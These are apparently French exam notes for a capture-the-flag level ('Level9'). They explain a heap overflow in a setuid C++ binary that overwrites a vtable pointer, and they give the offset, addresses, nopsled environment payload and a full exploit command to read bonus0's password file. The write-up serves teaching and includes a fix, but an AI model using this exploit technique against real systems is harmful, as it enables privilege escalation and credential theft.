# Level9 - Exam Notes

## 1. Objective
Obtenir un shell **bonus0**. Binaire C++ setuid bonus0 ; pas de system ni "/bin/sh" dans le binaire. Il faut exécuter du shellcode (ex. execve("/bin/sh")), par ex. dans l’environnement, et détourner l’appel virtuel vers cette adresse.

## 2. Initial diagnosis (before GDB)
- **Comportement :** deux objets **N** (0x6c octets). setAnnotation(premier, argv[1]) = **memcpy(premier+4, argv[1], strlen(argv[1]))** sans borne → overflow depuis le buffer d’annotation du premier vers le second. Appel virtuel : (*(second->vptr))(second, first). Le **vptr** du second est à l’offset 0 du second ; second = premier+0x6c.
- **Offset :** 4 (vptr premier) + 100 (annotation) + 4 (membre int) = **108** octets pour atteindre le vptr du second.
- **Succès :** en mettant **premier+4** (0x0804a00c) dans second->vptr, l’appel lit *(premier+4) et saute à cette adresse. Si on place à premier+4 l’**adresse du shellcode** (ex. dans env), le call exécute notre code.
- **Hypothèse :** overflow ; second->vptr = premier+4 ; *(premier+4) = adresse shellcode (nopsled dans env). Pas de ret2libc (pas de system dans le binaire).

## 3. GDB diagnosis (how the vulnerability was found)
- **Où break :** juste avant l’appel virtuel (ex. main+136 à main+159 : mov eax,[second]; mov eax,[eax]; mov edx,[eax]; call edx). But : vérifier que second->vptr = 0x0804a00c et que *(premier+4) = adresse du shellcode.
- **Layout :** premier [vptr 4][annotation 100][int 4] = 0x6c ; second [vptr 4][...]. Overflow de 108 octets : 4+100+4. `x/wx premier`, `x/wx second` pour voir les adresses. Après payload : second->vptr doit valoir **0x0804a00c** (premier+4).
- **Adresse premier+4 :** symbole ou calcul depuis l’adresse de premier (ex. 0x0804a008 → premier+4 = 0x0804a00c). Objet alloué par new(0x6c).
- **Adresse du shellcode :** env avec nopsled + shellcode. En GDB : `env -i payload=$(python -c 'print "\x90"*1000+"<shellcode>"') ./level9`, puis `run <payload_file` ou avec argv[1], puis `x/500s environ` pour une adresse dans le nopsled (ex. **0xbffffc63**). Sans ASLR sur la VM, cette adresse est stable.
- **Contrôle du flux :** au call edx, edx = *(premier+4) = notre adresse env. Donc le flux saute vers le nopsled puis le shellcode. Vérifier en ni ou en lançant l’exploit.

## 4. Building the exploit command
- **Cible :** (1) second->vptr = premier+4 (0x0804a00c) ; (2) *(premier+4) = adresse du shellcode. Donc argv[1] : [4 octets = adresse shellcode LE] + [104 octets padding] + [4 octets = 0x0804a00c LE].
- **Structure :** octets 0–3 : adresse du nopsled (ex. 0xbffffc63 → \x63\xfc\xff\xbf). Octets 4–107 : padding (104 octets). Octets 108–111 : premier+4 (0x0c\xa0\x04\x08). Shellcode et nopsled dans la variable d’env **payload**.
- **Encodage :** adresses en LE. Pas de \n dans le shellcode (argv[1] peut en contenir après les 112 octets si besoin). Python pour générer argv[1] et env.
- **Invocation :** `env -i payload=$(python -c 'print "\x90"*1000+"<shellcode>"') ./level9 $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')`. Remplacer 0xbffffc63 par l’adresse trouvée en GDB.
- **Référence commands.md :** section Exploitation (ou « Alternative : ret2env » pour level9). L’offset 108, l’adresse premier+4 et l’adresse du nopsled viennent du diagnostic GDB.

## 5. Exploitation logic
Overflow dans setAnnotation : memcpy(this+4, src, strlen(src)) sans limite ; on écrase le vptr du second. En mettant premier+4 dans second->vptr, la « vtable » lue est notre buffer : l’entrée est *(premier+4). On y met l’adresse du shellcode (env). Le call indirect saute vers le shellcode → shell.

## 6. Reproducible procedure (for evaluation)
- **Commande :** selon commands.md, avec l’adresse nopsled trouvée en GDB. Ex. : `env -i payload=$(...) ./level9 $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')` puis `cat /home/user/bonus0/.pass`.
- **Résultat attendu :** shell bonus0.
- **À dire :** « setAnnotation fait un memcpy sans borne ; j’écrase le vptr du second avec premier+4. À l’appel virtuel le programme lit *(premier+4) et y saute ; j’y mets l’adresse de mon shellcode dans l’env. »

## 7. Oral defense points
- **Bug :** memcpy(this+4, src, strlen(src)) dans setAnnotation sans borne ; overflow vers le second objet, écrasement du vptr.
- **GDB :** offset 108, second->vptr = premier+4, *(premier+4) = adresse shellcode ; adresse nopsled via x/s environ.
- **Payload :** [addr shellcode][104 padding][premier+4]. Le programme « croit » que la vtable est à premier+4 et lit la cible du call à cette adresse.
- **Fix :** borner la copie (memcpy avec taille max) ou valider que la source ne dépasse pas la taille du buffer d’annotation.

## 8. Common evaluator questions
- **Pourquoi premier+4 dans le vptr ?** Pour que l’appel virtuel lise la « fonction » à *(premier+4) ; on y met l’adresse du shellcode.
- **Pourquoi le shellcode dans l’env ?** argv[1] est utilisé pour l’overflow ; l’env donne une adresse stable (sans ASLR) pour le nopsled + shellcode.
- **Comment obtiens-tu l’adresse du nopsled ?** En GDB avec `env -i payload=... ./level9`, puis `x/500s environ` pour l’adresse de la variable payload.
- **Offset 108 ?** 4 (vptr premier) + 100 (annotation) + 4 (membre int) = 108 jusqu’au vptr du second (premier+0x6c).
